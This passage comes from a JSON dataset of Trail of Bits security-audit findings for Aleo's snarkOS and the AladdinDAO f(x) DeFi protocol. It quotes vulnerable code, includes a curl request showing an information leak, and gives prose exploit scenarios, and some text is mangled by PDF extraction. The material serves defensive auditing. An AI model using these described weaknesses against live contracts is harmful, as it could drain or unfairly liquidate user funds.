usize) -> ParserResult<Vec<Operand<N>>> { let mut operands = Vec::with_capacity(num_operands); let mut string = string; for _ in 0..num_operands { // Parse the operand from the string. let (next_string, operand) = Operand::parse(string)?; // Update the string. string = next_string; // Push the operand. operands.push(operand); } Ok((string, operands)) } Figure 3.22: synthesizer/program/src/logic/instruction/operation/hash.rs#295309 Recommendations Short term, resolve all of the dierences between the grammar and the implementation. Long term, add tests for all of the cases identied in the nding; add tests for all optional or variable repetition in the grammar.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "9. The /testnet3/node/env API endpoint provides binary path and repository information ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "The /testnet3/node/env REST API endpoint leaks certain information about the system that the node is running on, such as the path to the snarkOS binary, Git repository branch name, or commit ID. Figure 9.1 shows an example of information that could be leaked. Depending on how the user deployed and ran the node and what else is running on the same system, the leaked information may be useful for an attacker to further exploit the machine. Also, the endpoint returns command line arguments that could contain sensitive information such as private keys. The node mitigates the exposure of private keys by omitting any arguments that start with the APrivateKey prex in the EnvInfo.register function. However, if a new sensitive argument were added to the command line arguments, there is a chance the node may not omit it. $ curl -vvv vm.aleo.org/api/testnet3/node/env ... { \"package\": \"\", \"host\": \"\", \"rustc\": \"\", \"args\": [ \"/root/.cargo/bin/snarkos\", \"start\", \"--nodisplay\", \"--cdn\", \"\", \"--connect\", \"24.199.74.2:4133,167.172.14.86:4133,159.203.146.71:4133,188.166.201.188:4133,161.35 .247.23:4133,144.126.245.162:4133,138.68.126.82:4133,159.89.211.64:4133,170.64.252.5 8:4133,143.244.211.239:4133\", \"--rest\", \"0.0.0.0:12345\", \"--logfile\", \"/dev/null\", \"--verbosity\", \"4\", \"--beacon\" ], \"repo\": \"\", \"branch\": \"\", \"commit\": \"\" } Figure 9.1: An example request to the /testnet3/node/env API endpoint Recommendations Short term, remove the binary path and Git repository information from the /testnet3/node/env API endpoint to prevent the node from leaking information that users may not want to publish.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "10. Maximum peer message limit is o\u0000 by one ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "The Inbound::inbound function contains a comment stating that it drops a peer if they sent more than 1,000 messages in the last 5 seconds. However, in practice, due to the num_messages >= 1000 check (gure 10.1), it actually allows for only 999 messages. /// Handles the inbound message from the peer. async fn inbound(&self, peer_addr: SocketAddr, message: Message<N>) -> Result<()> { // (...) // Drop the peer, if they have sent more than 1000 messages in the last 5 seconds. let num_messages = self.router().cache.insert_inbound_message(peer_ip, 5); if num_messages >= 1000 { bail!(\"Dropping '{peer_ip}' for spamming messages (num_messages = {num_messages})\") } Figure 10.1: node/router/src/inbound.rs#L45-L57 Recommendations Short term, change the >= comparison to > in the Inbound::inbound function. Also, declare constants for the maximum number of messages value (1000) and for the time interval to be checked (5 seconds).",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "24. Garbage collection does not collect the next_gc_round ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "The garbage collection routine implemented in the Storage::update_current_round function does not remove old certicates up to self.gc_round, contrary to what is stated in the structures eld description: /// The `round` for which garbage collection has occurred **up to** (inclusive). gc_round: Arc<AtomicU64>, Figure 24.1: node/narwhal/src/helpers/storage.rs#L55-L56 if next_gc_round > current_gc_round { // Remove the GC round(s) from storage. for gc_round in current_gc_round..next_gc_round { // Iterate over the certificates for the GC round. for certificate in self.get_certificates_for_round(gc_round).iter() { // Remove the certificate from storage. self.remove_certificate(certificate.certificate_id()); } } // Update the GC round. self.gc_round.store(next_gc_round, Ordering::SeqCst); Figure 24.2: node/narwhal/src/helpers/storage.rs#L160-L170 Recommendations Short term, make the garbage collection include the next_gc_round by iterating in current_gc_round..=next_gc_round. Long term, add garbage collection tests to ensure that the correct rounds are removed in the correct round.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "25. Fee verication is o\u0000 by one ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "The fee validation function rejects fees equal to the MAX_FEE value: ensure!(*fee_amount < N::MAX_FEE, \"Fee verification failed: fee exceeds the maximum limit\"); Figure 25.1: synthesizer/src/vm/verify.rs#L213-L213 Recommendations Short term, allow the fee to equal MAX_FEE. Long term, add positive and negative tests to check that the fee verication is implemented correctly.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "31. The order of the saturating_add and checked_sub operations is not documented ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "The update_total_supply function uses both saturating_add and checked_sub operations to compute the next_total_supply value. Using both of these operations can lead to a dierent value for total_suply if the order of the operations is changed. Since this is an edge case for when the value of starting_supply is close to u64::MAX, documenting this behavior should suce. As an example, let the starting supply be u64::MAX, BLOCK_REWARD be 1, PUZZLE_REWARD be 1, and fee be 1_000_000_000. This would result in an updated total supply of initial - fee. On the other hand, if the fee were subtracted before the rewards were added, then the nal result would be initial - fee + 2. pub fn update_total_supply<N: Network>( starting_total_supply_in_microcredits: u64, block_reward: u64, puzzle_reward: u64, transactions: &Transactions<N>, ) -> Result<u64> { // Initialize the next total supply of microcredits. let mut next_total_supply = starting_total_supply_in_microcredits; // Add the block reward to the total supply. next_total_supply = next_total_supply.saturating_add(block_reward); // Add the puzzle reward to the total supply. next_total_supply = next_total_supply.saturating_add(puzzle_reward); // Iterate through the transactions to calculate the next total supply of microcredits. for confirmed in transactions.iter() { // Subtract the fee from the total supply. next_total_supply = next_total_supply .checked_sub(*confirmed.fee_amount()?) .ok_or_else(|| anyhow!(\"The proposed fee underflows the total supply of microcredits\"))?; // Iterate over the transitions in the transaction. for transition in confirmed.transaction().transitions() { // If the transition contains a split, subtract the amount from the total supply. if transition.is_split() { records - input records == 10_000u64. // TODO (howardwu): Add a test that calls `split`, checks the output // Subtract the amount split from the total supply. next_total_supply = next_total_supply .checked_sub(10_000u64) .ok_or_else(|| anyhow!(\"The proposed split underflows the total supply of microcredits\"))?; } } } Figure 31.1: ledger/src/helpers/supply.rs#L21-L52 Recommendations Short term, document that the order of saturating additions and subtractions matters. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "1. Redeeming xToken and fToken simultaneously uses incorrect TWAP price ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-03-aladdinfxprotocol-securityreview.pdf",
        "body": "The Market contract redeems either the leverage token (xToken) or fractional token (fToken) and is currently the only contract that can redeem tokens from the Treasury contract. However, the market role can be granted to contracts, which permits simultaneous redemption of both token types. If both tokens are redeemed at once, the xToken will receive the same price as if only an fToken were being redeemed. Following an update, a user may be able to manipulate the price to be maxPrice by depositing just a single fToken and consequently receive a greater amount of the base asset. function redeem ( uint256 _fTokenIn , uint256 _xTokenIn , address _owner ) external override onlyRole(FX_MARKET_ROLE) returns ( uint256 _baseOut ) { FxStableMath.SwapState memory _state; if (_fTokenIn > 0 ) { _state = _loadSwapState(Action.RedeemFToken); } else { _state = _loadSwapState(Action.RedeemXToken); } [...] if (_state.xNav == 0 ) { if (_xTokenIn > 0 ) revert ErrorUnderCollateral(); // only redeem fToken proportionallly when under collateral. _baseOut = (_fTokenIn * _state.baseSupply) / _state.fSupply; } else { _baseOut = _state.redeem(_fTokenIn, _xTokenIn); } [...] _transferBaseToken(_baseOut, msg.sender ); } Figure 1.1: Implementation of the Treasurys redeem function ( aladdin-v3-contracts/contracts/f(x)/v2/TreasuryV2.sol#324357 ) 18 AladdinDAO f(x) Protocol Security Assessment function _loadSwapState (Action _action) internal view returns (FxStableMath.SwapState memory _state) { _state.baseSupply = totalBaseToken; _state.baseNav = _fetchTwapPrice(_action); Figure 1.2: The base assets value is computed using _loadSwapState ( aladdin-v3-contracts/contracts/f(x)/v2/TreasuryV2.sol#607609 ) Currently, redeeming an xToken will use the minPrice from the TWAP (time-weighted average price) to calculate how much base asset the user will receive. However, the _fetchTwapPrice function does not handle how the price should be determined in cases where both assets are being redeemed at once. As such, the Treasury should prevent this. function _fetchTwapPrice (Action _action) internal view returns ( uint256 _twapPrice ) { ( bool _isValid , uint256 _safePrice , uint256 _minPrice , uint256 _maxPrice ) = IFxPriceOracle(priceOracle).getPrice(); _twapPrice = _safePrice; if (_action == Action.MintFToken || _action == Action.MintXToken) { if (!_isValid) revert ErrorInvalidOraclePrice(); } else if (!_isValid) { if (_action == Action.RedeemFToken) { _twapPrice = _maxPrice; } else if (_action == Action.RedeemXToken) { _twapPrice = _minPrice; } } Figure 1.3: _fetchTwapPrice expects only one action ( aladdin-v3-contracts/contracts/f(x)/v2/TreasuryV2.sol#644656 ) Exploit Scenario A new market role is granted to a contract that allows redeeming xToken and fToken simultaneously, allowing the xToken to be redeemed at the incorrect price. Recommendations Short term, require that only one token is redeemed at a time by adding additional validation or creating two distinct entry points for redeeming either token. Long term, strictly validate inputs from external contracts (even trusted) to ensure upgrades or conguration do not allow an important check to be bypassed. 19 AladdinDAO f(x) Protocol Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. liquidatableCollateralRatio update can force liquidation without warning ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-03-aladdinfxprotocol-securityreview.pdf",
        "body": "The DEFAULT_ADMIN_ROLE can update the liquidatableCollateralRatio without notifying users who hold positions in the rebalance pool. This action could potentially trigger or hinder liquidations without giving users a chance to make adjustments. Only the DEFAULT_ADMIN_ROLE , which is a multisig wallet address controlled by the AladdinDAO development team, can call the update function for this important system parameter. This implies that updates will take eect immediately, without prior notice to protocol users. function updateLiquidatableCollateralRatio( uint256 _newRatio) external onlyRole(DEFAULT_ADMIN_ROLE) { uint256 _oldRatio = liquidatableCollateralRatio; liquidatableCollateralRatio = _newRatio; emit UpdateLiquidatableCollateralRatio(_oldRatio, _newRatio); } Figure 2.1: The updateLiquidatableCollateralRatio function ( BoostableRebalancePool.sol#376 381 ) The liquidatableCollateralRatio is used in the liquidate() function to benchmark the system's health and determine if a liquidation is required. if (_treasury.collateralRatio() >= liquidatableCollateralRatio) { revert CannotLiquidate(); } (, uint256 _maxLiquidatable) = _treasury.maxRedeemableFToken(liquidatableCollateralRatio); Figure 2.1: The updateLiquidatableCollateralRatio function ( BoostableRebalancePool.sol#313 316 ) If the liquidatableCollateralRatio were raised while the _treasury.collateralRatio() stays the same, a system in good standing could suddenly change so that the liquidate function can be successfully run. 20 AladdinDAO f(x) Protocol Security Assessment Exploit Scenario Bob, an f(x) protocol user, has a leveraged position of xETH that is close to the liquidation threshold. The AladdinDAO team calls updateLiquidatableCollateralRatio() and raises the liquidatableCollateralRatio variable. The LIQUIDATOR_ROLE calls liquidate() and Bob, along with other users positions, lose value. Recommendations Short term, give access control to a role that is managed by a governance contract where system parameter changes are subject to a timelock. Enforce a minimum and maximum bound for the liquidatableCollateralRatio to provide users with a clear expectation of any potential updates. Long term, when important protocol parameters are updated, it is crucial to allow users to adjust their positions or exit the system before these updates take eect. 21 AladdinDAO f(x) Protocol Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Panicking checked arithmetic may prevent deposits and withdraws to rebalance pool ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-03-aladdinfxprotocol-securityreview.pdf",
        "body": "The rebalance pools deposit and withdraw functionality computes the latest balance of a users account at each interaction. This calculation strictly assumes that the _newBalance amount is less than the old, but does not validate that this is the case. If this is ever not the case, the pool will revert due to Soliditys built-in checked arithmetic, and the user will not be able to deposit or withdraw. function deposit ( uint256 _amount , address _receiver ) external override { [...] _checkpoint(_receiver); Figure 3.1: Deposit invokes _checkpoint ( aladdin-v3-contracts/contracts/f(x)/rebalance-pool/ShareableRebalancePoo l.sol#250263 ) function _withdraw ( address _sender , uint256 _amount , address _receiver ) internal { _checkpoint(_sender); Figure 3.2: _withdraw invokes _checkpoint ( aladdin-v3-contractsaladdin-v3-contracts/contracts/f(x)/rebalance-pool/S hareableRebalancePool.sol#539545 ) function _checkpoint ( address _account ) internal virtual override { [...] TokenBalance memory _balance = _updateUserBalance(_account, _supply) ; TokenBalance memory _ownerBalance = _updateVoteOwnerBalance(_owner, _supply); _updateBoostCheckpoint(_account, _owner, _balance, _ownerBalance, _supply); } } 22 AladdinDAO f(x) Protocol Security Assessment Figure 3.3: _checkpoint invokes _updateUserBalance ( aladdin-v3-contracts/contracts/f(x)/rebalance-pool/ShareableRebalancePoo l.sol#465488 ) The following check should resemble _balance.amount > _newBalance in order to avoid reverting on the overow case and emit an event only when a real loss occurs (i.e., the users balance has decreased as indicated by the UserDepositChange events loss parameter). uint104 _newBalance = uint104 (_getCompoundedBalance(_balance.amount, _balance.product, _supply.product)); if ( _newBalance != _balance.amount ) { // no unchecked here, just in case emit UserDepositChange(_account, _newBalance, _balance.amount - _newBalance ); } Figure 3.4: _updateUserBalance can revert and prevent deposits/withdrawals ( aladdin-v3-contracts/contracts/f(x)/rebalance-pool/ShareableRebalancePoo l.sol#649653 ) Exploit Scenario A user deposits to the rebalance pool and is unable to withdraw because an overow causes the transaction to revert. Recommendations Short term, validate that _balance.amount > _newBalance is true before unconditionally performing checked arithmetic during interactions that users must be able to successfully complete. Long term, review the logical and arithmetic operations for incorrect assumptions and perform fuzz testing to identify corner cases like these. 23 AladdinDAO f(x) Protocol Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Incorrect TWAP price may be used for calculations such as collateral ratio ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-03-aladdinfxprotocol-securityreview.pdf",
        "body": "The swap state of the protocol uses the enum value, Action.None when it is loaded for operations aside from minting and redeeming. The implementation of _fetchTwapPrice does not revert when the action is Action.None and the TWAP price is invalid, allowing the invalid price to be used to compute the collateral ratio. Since other contracts rely on these values to perform important validations and calculations, it is important that the price is valid and accurate. function collateralRatio () public view override returns ( uint256 ) { FxStableMath.SwapState memory _state = _loadSwapState(Action.None) ; if (_state.baseSupply == 0 ) return PRECISION; if (_state.fSupply == 0 ) return PRECISION * PRECISION; return (_state.baseSupply * _state.baseNav) / _state.fSupply; } Figure 4.1: collateralRatio uses Action.None for its swap state ( aladdin-v3-contracts/contracts/f(x)/v2/TreasuryV2.sol#177184 ) function _fetchTwapPrice (Action _action) internal view returns ( uint256 _twapPrice ) { ( bool _isValid , uint256 _safePrice , uint256 _minPrice , uint256 _maxPrice ) = IFxPriceOracle(priceOracle).getPrice(); _twapPrice = _safePrice; if (_action == Action.MintFToken || _action == Action.MintXToken) { if (!_isValid) revert ErrorInvalidOraclePrice(); } else if (!_isValid) { if (_action == Action.RedeemFToken) { _twapPrice = _maxPrice; } else if (_action == Action.RedeemXToken) { _twapPrice = _minPrice; } } if (_twapPrice == 0 ) revert ErrorInvalidTwapPrice(); } 24 AladdinDAO f(x) Protocol Security Assessment Figure 4.2: _fetchTwapPrice does handle an invalid price for Action.None ( aladdin-v3-contracts/contracts/f(x)/v2/TreasuryV2.sol#644659 ) This also may aect the following calculations, isUnderCollateral and currentBaseTokenPrice , and other operations that use _loadSwapState(Action.None) . function isUnderCollateral () external view returns ( bool ) { FxStableMath.SwapState memory _state = _loadSwapState(Action.None); return _state.xNav == 0 ; } Figure 4.3: isUnderCollateral may use invalid price ( aladdin-v3-contracts/contracts/f(x)/v2/TreasuryV2.sol#187190 ) function currentBaseTokenPrice () external view override returns ( uint256 ) { return _fetchTwapPrice(Action.None); } Figure 4.4: currentBaseTokenPrice may use invalid price ( aladdin-v3-contracts/contracts/f(x)/v2/TreasuryV2.sol#249251 ) Exploit Scenario The rebalancer pool contract permits liquidations because it uses a value of collateralRatio that is based on an invalid price. This causes users to be liquidated at an unfair price. Recommendations Short term, dene and implement what price should be used if the price is invalid when the action is Action.None or revert, if appropriate. Long term, ensure the integrity and correctness of price calculations, especially those related to minting/ burning and depositing/withdrawing. 25 AladdinDAO f(x) Protocol Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "5. Updating strategy may cause users to lose funds during redemption ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-03-aladdinfxprotocol-securityreview.pdf",
        "body": "Collateral in the Treasury contract may be deposited into a strategy contract that the admin can update at any time. Since the update does not prevent collateral from being left in the old strategy contract or reset the balance that tracks the amount deposited in the strategyUnderlying strategy, users may receive substantially less than they are owed upon redeeming xToken and fToken, even though the collateral is available in the old strategy contract. Note that users may specify a minimum amount out in the market contract, but an admin would have to intervene and handle recovering the strategys assets to make them available to the user. function updateStrategy ( address _strategy ) external onlyRole(DEFAULT_ADMIN_ROLE) { _updateStrategy(_strategy); } Figure 5.1: Admin can update strategy without any validation ( aladdin-v3-contracts/contracts/f(x)/v2/TreasuryV2.sol#452455 ) function redeem ( uint256 _fTokenIn , uint256 _xTokenIn , address _owner ) external override onlyRole(FX_MARKET_ROLE) returns ( uint256 _baseOut ) { [...] if (_fTokenIn > 0 ) { IFxFractionalTokenV2(fToken).burn(_owner, _fTokenIn); } if (_xTokenIn > 0 ) { IFxLeveragedTokenV2(xToken).burn(_owner, _xTokenIn); } totalBaseToken = _state.baseSupply - _baseOut; _transferBaseToken(_baseOut, msg.sender); } Figure 5.2: The redeem function invokes _transferBaseToken ( aladdin-v3-contracts/contracts/f(x)/v2/TreasuryV2.sol#324357 ) 26 AladdinDAO f(x) Protocol Security Assessment The implementation of _transferBaseToken overrides the amount withdrawn when the strategy fails to return the remainder of the tokens owed to the user. Because strategyUnderlying may be the balance deposited to previous strategies, it is possible that the current strategy does not have sucient balance to fulll the decit; however, the operation, strategyUnderlying minus _diff , will not overow. This may cause the user to receive substantially less because the balances of the strategy contracts are not fully withdrawn before an admin updates the strategy contract. function _transferBaseToken ( uint256 _amount , address _recipient ) internal returns ( uint256 ) { _amount = getWrapppedValue(_amount); uint256 _balance = IERC20Upgradeable(baseToken).balanceOf( address ( this )); if (_balance < _amount) { uint256 _diff = _amount - _balance; IAssetStrategy(strategy).withdrawToTreasury(_diff); strategyUnderlying = strategyUnderlying - _diff; // consider possible slippage here. _balance = IERC20Upgradeable(baseToken).balanceOf( address ( this )); if (_amount > _balance) { _amount = _balance; } } IERC20Upgradeable(baseToken).safeTransfer(_recipient, _amount); Figure 5.3: Users may receive less than expected if the strategy does return the full decit. ( aladdin-v3-contracts/contracts/f(x)/v2/TreasuryV2.sol#585601 ) Exploit Scenario The admin updates the strategy while collateral is deposited. As a result, strategyUnderlying the number of base tokens in the strategyis greater than zero. If a user redeems via the Market contract and the Treasury cannot successfully withdraw sucient funds from the new strategy, the users fToken and xToken will have been burned without receiving their share of the base asset. Recommendations Short term, prior to updating the strategy, ensure that all funds have been withdrawn into the Treasury and that strategyUnderlying is reset to 0. Long term, investigate how to handle scenarios where the available collateral declines due to losses incurred by the strategy. 27 AladdinDAO f(x) Protocol Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Time-weighted Chainlink oracle can report inaccurate price ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-03-aladdinfxprotocol-securityreview.pdf",
        "body": "The Chainlink oracle used to price the value of ETH in USD is subject to a time-weighted average price that will over-represent or under-represent the true price in times of swift volatility. This can increase the likelihood of bad debt if a sudden price change is not acted on due to the lag, and it is too late once the collaterals loss in value is reected in the TWAP price. function _fetchPrice () internal view returns (CachedPrice memory _cached) { _cached.ETH_USDPrice = ITwapOracle(chainlinkETHTwapOracle).getTwap( block.timestamp ); _cached.frxETH_ETHPrice = ICurvePoolOracle(curvePool).ema_price(); _cached.frxETH_USDPrice = (_cached.ETH_USDPrice * _cached.frxETH_ETHPrice) / PRECISION; } Figure 6.1: Use of TWAP computed from Chainlink feed ( aladdin-v3-contracts/contracts/f(x)/oracle/FxFrxETHTwapOracle.sol#8589 ) Exploit Scenario The price of Ethereum jumps 10% over the course of 10 minutes. Eve notices the price discrepancy between the actual price and the reported price, and takes out a 4x long position on the frxETH pool. Once the time-weighted average price of ETH catches up to the actual price, Eve cashes out her long position for a prot. Recommendations Short term, remove the reliance on a time-weighted average price, at least for liquidations. It is best to be punitive when pricing debt and conservative when valuing collateral, so the TWAP may be appropriate for minting. Long term, adhere to best practices for oracle solutions and ensure backup oracles and safety checks do not create credit risk. 28 AladdinDAO f(x) Protocol Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. Net asset value of fractional and leverage token may reect invalid price ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-03-aladdinfxprotocol-securityreview.pdf",
        "body": "The contracts for the fToken and xToken minted by the Treasury expose a method, nav , to retrieve the net asset value (NAV) of tokens. This represents what portion of Treasurys reserve collateral is available to be redeemed in exchange for the given token. However, the NAV uses currentBaseTokenPrice indiscriminately and fails to validate that the price is valid. As outlined in the aforementioned issue ( TOB-ADFX-4 ), fetching the TWAP using the Action.None value may return an invalid price. External integrations that rely on this price may misreport the true NAV or use the incorrect value in calculations, and will therefore get incorrect results. function currentBaseTokenPrice () external view override returns ( uint256 ) { return _fetchTwapPrice(Action.None); } Figure 7.1: Base token price may return invalid TWAP price ( aladdin-v3-contracts/contracts/f(x)/v2/TreasuryV2.sol#249251 ) function nav () external view override returns ( uint256 ) { uint256 _xSupply = totalSupply(); if (IFxTreasuryV2(treasury).isUnderCollateral()) { return 0 ; } else if (_xSupply == 0 ) { return PRECISION; } else { uint256 baseNav = IFxTreasuryV2(treasury).currentBaseTokenPrice(); uint256 baseSupply = IFxTreasuryV2(treasury).totalBaseToken(); uint256 fSupply = IERC20Upgradeable(fToken).totalSupply(); return (baseNav * baseSupply - fSupply * PRECISION) / _xSupply; } } Figure 7.2: Leveraged token uses currentBaseTokenPrice without checking it is valid ( aladdin-v3-contracts/contracts/f(x)/v2/LeveragedTokenV2.sol#5567 ) 29 AladdinDAO f(x) Protocol Security Assessment function nav () external view override returns ( uint256 ) { uint256 _fSupply = totalSupply(); if (_fSupply > 0 && IFxTreasuryV2(treasury).isUnderCollateral()) { // under collateral uint256 baseNav = IFxTreasuryV2(treasury).currentBaseTokenPrice(); uint256 baseSupply = IFxTreasuryV2(treasury).totalBaseToken(); return (baseNav * baseSupply) / _fSupply; } else { return PRECISION; } } Figure 7.3: Fractional token uses currentBaseTokenPrice without checking it is valid ( aladdin-v3-contracts/contracts/f(x)/v2/FractionalTokenV2.sol#5363 ) Recommendations Short term, consider reverting if the price is deemed invalid rather than reecting the invalid price in the net asset value, or add an additional return value that external integrations can use to determine whether the NAV is based on an invalid price. Long term, perform consistent validation throughout the codebase and add tests for scenarios where the price is considered invalid. 30 AladdinDAO f(x) Protocol Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "8. Collateral ratio does not account underlying value of collateral in strategy ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-03-aladdinfxprotocol-securityreview.pdf",
        "body": "When collateral is moved into the strategy, the totalBaseToken amount remains unchanged. This does not account for shortfalls and surpluses in the value of the collateral moved into the strategy, and as a result, the collateral ratio may be over-reported or under-reported, respectively. The integration of strategies in the treasury has not been fully designed and has aws as evidenced by TOB-ADFX-5 . This feature should be reconsidered and thoroughly specied prior to active use. For example, it is unclear whether the strategys impact on the collateral ratio is robust below 130%. It may benet the stability of the system to prevent too much of the collateral from entering strategies during periods of high volatility or when the system is not overcollateralized by implementing a buer, or a maximum threshold of the amount of collateral devoted to strategies. function transferToStrategy ( uint256 _amount ) external override onlyStrategy { IERC20Upgradeable(baseToken).safeTransfer(strategy, _amount); strategyUnderlying += _amount; } Figure 8.1 Collateral is moved into strategy without updating totalBaseToken ( aladdin-v3-contracts/contracts/f(x)/v2/TreasuryV2.sol#375378 ) Since totalBaseToken is not updated for strategies, it may not be reected correctly in the amount of base token available to be harvested as reported by the harvestable function. function harvestable () public view returns ( uint256 ) { uint256 balance = IERC20Upgradeable(baseToken).balanceOf( address ( this )); uint256 managed = getWrapppedValue(totalBaseToken); if (balance < managed) return 0 ; else return balance - managed; } Figure 8.2: The rewards available to harvest does not consider value of strategy ( aladdin-v3-contracts/contracts/f(x)/v2/TreasuryV2.sol#274279 ) 31 AladdinDAO f(x) Protocol Security Assessment Recommendations Short term, disable the use of strategies for active deployments and consider removing the functionality altogether until it is fully specied and implemented. Long term, limit the number of features in core contracts and do not prematurely merge incomplete features. 32 AladdinDAO f(x) Protocol Security Assessment 9. Rewards are withdrawn even if protocol is not su\u0000ciently collateralized Severity: Informational Diculty: Medium Type: Undened Behavior Finding ID: TOB-ADFX-9 Target: contracts/f(x)/v2/TreasuryV2.sol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Rebalance pool withdrawal silently fails ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-03-aladdinfxprotocol-securityreview.pdf",
        "body": "The FxUSDShareableRebalancePool contract disallows withdrawals by commenting out the internal call, which will silently fail for external integrations and users. Instead, the call should revert and provide a clear error message explaining that withdrawing fToken is disabled. function withdraw ( uint256 _amount , address _receiver ) external override { // not allowed to withdraw as fToken in fxUSD. // _withdraw(_msgSender(), _amount, _receiver); } Figure 10.1: Withdraw function with commented-out code ( aladdin-v3-contracts/contracts/f(x)/rebalance-pool/FxUSDShareableRebalan cePool.sol#2629 ) Recommendations Short term, revert with a custom error if the function, withdraw , is called. Long term, do not leave commented-out code and explicitly handle error cases. 35 AladdinDAO f(x) Protocol Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "11. Upgradeable contract initialization calls are commented out ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-03-aladdinfxprotocol-securityreview.pdf",
        "body": "The usage of OpenZeppelins upgradeable smart contract library requires that the parent contracts init functions are called in the childs initialize function. However, this is commented out in the ShareableRebalancePool contract. Currently, these calls are no-ops and have no eect. However, prior to upgrading the library dependency, this code should be updated to reect the target librarys implementation and ensure that the upgrade does not introduce a bug. // __Context_init(); // from ContextUpgradeable, comment out to reduce codesize // __ERC165_init(); // from ERC165Upgradeable, comment out to reduce codesize // __AccessControl_init(); // from AccessControlUpgradeable, comment out to reduce codesize Figure 11.1: Commented-out init functions ( aladdin-v3-contracts/contracts/f(x)/rebalance-pool/ShareableRebalancePoo l.sol#187189 ) Recommendations Short term, nd an alternative solution to avoid hitting the maximum code size limit. Long term, avoid commented-out, dead code and ensure that library upgrades do not introduce new bugs. 36 AladdinDAO f(x) Protocol Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. Sum of all user shares does not equal total supply ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-03-aladdinfxprotocol-securityreview.pdf",
        "body": "The FxInitialFund contract allows users to deposit up until the mint occurs, then funds can be withdrawn. Because users cannot deposit after withdrawals are enabled, the totalSupply is never updated and is therefore not accurate after withdrawals. While this does not aect the pro-rata share of fToken and xToken that each user receives, it does make the total supply of shares inaccurate. Rather than recompute the proportion of tokens a share is entitled to each time and hold the total supply constant, the amount of fToken and xToken each share is worth can be cached in the mint function, and the total supply can be decremented each time a withdrawal is made. This accomplishes the same functionality for withdrawals and ensures that the total supply of shares is accurately tracked. function withdraw ( address receiver ) external { if (!initialized) revert ErrorNotInitialized(); if (!fxWithdrawalEnabled) revert ErrorFxWithdrawalNotEnabled(); uint256 _share = shares[_msgSender()]; shares[_msgSender()] = 0 ; uint256 _totalShares = totalShares; uint256 _fAmount = (_share * totalFToken) / _totalShares; uint256 _xAmount = (_share * totalXToken) / _totalShares; IERC20(fxUSD).safeTransfer(receiver, _fAmount); IERC20(xToken).safeTransfer(receiver, _xAmount); } Figure 12.1: User share is set to zero but totalSupply is unchanged ( aladdin-v3-contracts/contracts/f(x)/v2/FxInitialFund.sol#141154 ) function mint () external onlyRole(MINTER_ROLE) { if (initialized) revert ErrorInitialized(); uint256 _balance = IERC20(baseToken).balanceOf( address ( this )); IERC20(baseToken).safeTransfer(treasury, _balance); ( uint256 _totalFToken , uint256 _totalXToken ) = IFxTreasuryV2(treasury).initializeProtocol( 37 AladdinDAO f(x) Protocol Security Assessment IFxTreasuryV2(treasury).getUnderlyingValue(_balance) ); IERC20(fToken).safeApprove(fxUSD, _totalFToken); IFxUSD(fxUSD).wrap(baseToken, _totalFToken, address ( this )); totalFToken = _totalFToken; totalXToken = _totalXToken; initialized = true ; } Figure 12.2: The mint function ( aladdin-v3-contracts/contracts/f(x)/v2/FxInitialFund.sol#160175 ) Recommendations Short term, compute the amount of fToken and xToken to distribute per share in the mint function, and update the withdraw function to use this amount and decrement the total supply of shares. Long term, ensure that user balances and the sum of all user balances, total supply, is synchronized, and implement invariant testing. This can also be applied to other balances, such as rewards per individual and total available rewards. 38 AladdinDAO f(x) Protocol Security Assessment",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
